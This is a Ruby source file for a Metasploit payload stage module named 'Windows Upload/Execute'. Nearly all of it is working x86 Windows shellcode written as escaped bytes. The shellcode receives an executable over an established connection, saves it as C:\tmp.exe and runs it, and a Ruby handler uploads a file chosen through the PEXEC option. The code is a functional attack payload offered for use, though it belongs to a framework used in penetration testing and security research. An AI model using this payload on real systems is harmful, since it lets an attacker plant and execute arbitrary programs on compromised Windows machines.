require 'msf/core'

module Msf
module Payloads
module Stages
module Windows

module UploadExec

	include Msf::Payload::Windows

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Upload/Execute',
			'Version'       => '$Revision$',
			'Description'   => 'Uploads an executable and runs it',
			'Author'        => 'vlad902',
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Session'       => Msf::Sessions::CommandShell,
			'Stage'         =>
				{
					'Offsets' =>
						{
							'EXITFUNC' => [ 385, 'V' ]
						},
					'Payload' =>
						"\x81\xec\x40\x00\x00\x00\xfc\x89\xfb\xe8\x48\x00\x00\x00\x60\x8b" +
						"\x6c\x24\x24\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b" +
						"\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0" +
						"\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b" +
						"\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b" +
						"\x89\x6c\x24\x1c\x61\xc3\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b" +
						"\x70\x1c\xad\x8b\x40\x08\x50\x89\xe6\x68\x8e\x4e\x0e\xec\xff\x36" +
						"\xff\x56\x04\x66\x68\x00\x00\x66\x68\x33\x32\x68\x77\x73\x32\x5f" +
						"\x89\xe5\x55\xff\xd0\x89\x46\x08\x68\xb6\x19\x18\xe7\xff\x76\x08" +
						"\xff\x56\x04\x89\x46\x0c\x6a\x00\x6a\x04\x55\x53\xff\x56\x0c\x8b" +
						"\x7d\x00\xe8\x0b\x00\x00\x00\x43\x3a\x5c\x74\x6d\x70\x2e\x65\x78" +
						"\x65\x00\x58\x89\x46\x10\x68\xa5\x17\x00\x7c\xff\x36\xff\x56\x04" +
						"\x6a\x00\x6a\x06\x6a\x04\x6a\x00\x6a\x07\x68\x00\x00\x00\xe0\xff" +
						"\x76\x10\xff\xd0\x89\x46\x14\x81\xec\x04\x08\x00\x00\x89\xe5\x68" +
						"\x1f\x79\x0a\xe8\xff\x36\xff\x56\x04\x89\x46\x18\x6a\x00\x68\x00" +
						"\x08\x00\x00\x55\x53\xff\x56\x0c\x29\xc7\x50\x89\xe1\x6a\x00\x51" +
						"\x50\x55\xff\x76\x14\xff\x56\x18\x58\x85\xff\x75\xdf\x68\xfb\x97" +
						"\xfd\x0f\xff\x36\xff\x56\x04\xff\x76\x14\xff\xd0\x6a\x50\x59\x29" +
						"\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42" +
						"\x2c\x93\x8d\x7a\x38\xab\xab\xab\x68\x72\xfe\xb3\x16\xff\x36\xff" +
						"\x56\x04\x57\x52\x51\x51\x51\x6a\x01\x51\x51\xff\x76\x10\x51\xff" +
						"\xd0\x68\xad\xd9\x05\xce\xff\x36\xff\x56\x04\x6a\xff\xff\x37\xff" +
						"\xd0\x68\x25\xb0\xff\xc2\xff\x36\xff\x56\x04\xff\x76\x10\xff\xd0" +
						"\x68\xe7\x79\xc6\x79\xff\x76\x08\xff\x56\x04\xff\x77\xfc\xff\xd0" +
						"\x68\x7e\xd8\xe2\x73\xff\x36\xff\x56\x04\xff\xd0"
				}
			))

		register_options(
			[
				OptPath.new('PEXEC', [ true, "Full path to the file to upload and execute" ])
			], UploadExec)
	end

	#
	# Uploads and executes the file
	#
	def handle_connection_stage(conn)
		begin
			data = ::IO.readlines(datastore['PEXEC']).join('')
		rescue
			print_error("Failed to read executable: #{$!}")

			# TODO: exception
			conn.close
			return
		end

		print_status("Uploading executable (#{data.length} bytes)...")

		conn.put([ data.length ].pack('V'))
		conn.put(data)

		print_status("Executing uploaded file...")

		super
	end

end

end end end end
